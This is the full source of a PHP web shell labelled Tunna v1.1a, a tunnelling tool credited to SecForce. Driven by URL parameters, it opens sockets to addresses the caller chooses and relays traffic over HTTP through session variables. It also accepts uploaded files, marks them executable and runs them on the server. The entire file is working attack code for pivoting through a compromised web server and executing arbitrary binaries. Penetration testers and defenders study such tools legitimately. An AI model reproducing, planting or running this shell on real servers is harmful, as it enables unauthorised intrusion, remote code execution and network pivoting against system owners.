<?php
//
//Tunna PHP webshell v1.1a (c) 2014 by Nikos Vassakis
//http://www.secforce.com / nikos.vassakis <at> secforce.com
//
if(!empty($_GET)){
	if(isset($_GET["proxy"])){	//if url parameter proxy is set
		class messenger{		//handles the communication between webserver and socket
			public $address = "";
			public $port;
			public $socket;
			public $met_data = "";
			public $handler_data = "";
			
			function __construct($port,$ip){	//Initialises socket values
				if ($port != ""){
					$this->port=$port;
				}
				else{
					$this->port=4444;
				}
				if ($ip != ""){
					$this->address=$ip;
				}
				else{
					$this->address='127.0.0.1';
				}
				$this->connect_to_server();
				$this->run_loop();
			}

			public function __destruct()		//Close the socket
			{
				socket_close($this->socket);
			}
			
			function connect_to_server()		//Create and commect to socket
			{
				/* Create a TCP/IP socket. */
				$this->socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
				if ($this->socket === false) {	exit ("[Server] Unable to create socket");	}
				
				$result = @socket_connect($this->socket, $this->address, $this->port);
				
				if ($result === false) { exit ("[Server] Unable to connect to socket");	}
				
				socket_set_nonblock($this->socket);	//Socket in non-blocking mode because of the consecutive HTTP requests
				
				return $this->socket;
			}
			/*
			 * Received data is written on the SESSION['handler_data']
			 * There's a loop function (run_loop) that checks the SESSION variable for data and writes them to the socket
			 * If there's data to be read from the socket the loop function puts them at the SESSION variable met_data
			 * 
			 * At every request if there is data to be sent back they get send as a response
			 * 
			 */
			public function update_session_data()
			{
				@session_start();
				
				$_SESSION['met_data'] .= $this->met_data;
				$this->handler_data .= $_SESSION['handler_data'];
				$_SESSION['handler_data'] = "";
				session_write_close();
				$this->met_data="";
			}

			function run_loop(){	//This will stall the thread / request
				$i=0;
				while($_SESSION['running'] != -1){
					#read from local socket and put on session variable
					while ($out = socket_read($this->socket, 8192)) {
						if($out === false){ exit("[Server] Unable to read from local socket");	}
						$this->met_data .= $out;
					}
					#If data on SESSION variable write data to local socket
					if ($this->handler_data != ""){	
						$in=socket_write($this->socket, $this->handler_data, strlen($this->handler_data));
						if($in === false){ exit("[Server] Unable to write to local socket");	}
						$this->handler_data = "";		
					}
					$this->update_session_data();
					if (!stristr(PHP_OS, "linux")){sleep(0.2);}	//added to work with apache/IIS on windows otherwise the consecutive reads DoS the socket
				}
			}
		}
		//Report all errors
		error_reporting(E_ALL);
		ini_set( 'display_errors','1');
		set_time_limit(0);		//Time limit for request set to infinate for the loop function
		$ip="";
		$port="";
		$session_started=false;
		
		try {
			if(session_start() === false){exit("[Server] Couldnt Start Session");}
		} catch (Exception $e) {
			$_SESSION['running'] == 0;
		}
		
		if(isset($_GET["file"])){	//if url variable file is received
			if(isset($_GET["upload"])){	//read binary from request and write to temp dir
				$file = $_FILES["proxy"];
				if ($file["error"] > 0 or empty($file)){
					exit("[Server]: No File Selected");
				}
				else{
					if(move_uploaded_file($file["tmp_name"], sys_get_temp_dir() . "/" . $file["name"])){
						echo "[Server] File Uploaded at " . sys_get_temp_dir() . "/" . $file["name"];	
						$_SESSION['file'] = sys_get_temp_dir() . "/" . $file["name"];
						exit();
					}
					else	{
						exit("[Server] Error Uploading File");
					}
				}
			}
		}
		if(isset($_GET["close"])){		//if url parameter close is received the connection is closed
			$_SESSION['running'] = -1;
			echo "[Server] Closing the connection and killing the handler thread";
			if(isset($_SESSION['pid'])){
				echo "\n[Server] *Check that the socks process ".$_SESSION['pid']." is killed ";
			}
			if(isset($_SESSION['file'])){
				unlink($_SESSION['file']);
			}
			exit();
		}
		if(isset($_GET["port"])){		//if port is specified in url connects to that port
			$port=$_GET["port"];
		}
		if(isset($_GET["ip"])){			//if ip is specified in url connects to that ip
			$ip=$_GET["ip"];
		}

		if (!isset($_SESSION['running'])) {	//1st request: initiate the session
			$_SESSION['running'] = 0;
			$_SESSION['met_data'] = "";
			$_SESSION['handler_data'] = "";
			//Closing session_write otherwise next attempt to write to session will block
			session_write_close();
			if (stristr(PHP_OS, "linux")){		
				echo "[Server] All good to go, ensure the listener is working ;-)\n[FILE]:[LINUX]\n";
			}
			else{
				echo "[Server] All good to go, ensure the listener is working ;-)\n[FILE]:[WIN]\n";
			}
		}
		else{
			if ($_SESSION['running'] == 0){	//2nd request: get configuration options
				$_SESSION['running'] = 1;
				session_write_close();
			/*
			 * This will create a stalling thread for the loop function
			 * that reads and writes data from the socket to the response 
			 * and from the request body to the socket
			 * 
			 */
			 
			 if (isset($_SESSION['file'])){
				 $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
				 //Get Random Port
				 socket_bind($socket, 'localhost', 0);
				 socket_getsockname($socket, $ip, $port);
				 socket_close($socket);
				 //Execute
				 if (stristr(PHP_OS, "linux")){		
					exec("chmod +x " . $_SESSION['file']);			//if linux: need to make it an executable first	
				}
				//start process & save pid
				//popen("start /B ". $_SESSION['file'], "r");	//Execute in windows
				$proc=proc_open(($_SESSION['file']." ".$port),array(),$foo);
				$pid=proc_get_status($proc);	
				$_SESSION['pid']=$pid['pid'];
				echo "[Server] Run ".$pid['pid'];
				sleep(2);
			 }
				//connect
				$mymessenger = new messenger($port,$ip);
			}
			else{	
			/* If session and socket are initialised
			 * Read data from request body and update the SESSION var
			 * 
			 * If data is on the SESSION var send them with the response
			 */
				header('Content-Type: application/octet-stream');
				#write to buffer for server
				$_SESSION['handler_data'] .= file_get_contents("compress.zlib://php://input");
				#read buffer for client
				echo $_SESSION['met_data'];
				$_SESSION['met_data'] = "";	//clear variable
				session_write_close();
			}
		}
	}
	else{
		echo "Tunna v1.1a"; //Version 1.1a
	}
}
?>
